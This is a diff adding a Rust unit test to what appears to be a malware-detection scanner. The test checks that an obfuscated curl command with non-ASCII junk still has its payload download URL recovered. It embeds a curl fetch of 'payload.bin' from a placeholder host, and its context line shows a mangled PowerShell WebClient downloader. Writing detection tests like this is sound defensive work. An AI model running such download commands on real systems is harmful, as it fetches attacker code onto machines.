@@ -15591,6 +15591,26 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_non_ascii_tokens_do_not_panic_prefix_checks() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "curl X:~49,1%¥Yr -\"%Ջლ能% https://curl-nonascii-token.example/payload.bin",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://curl-nonascii-token.example/payload.bin"
+            )
+        });
+        assert!(
+            has,
+            "curl URL not recovered after non-ASCII tokens: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_spaced_long_options_case_insensitive_in_deob_text() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
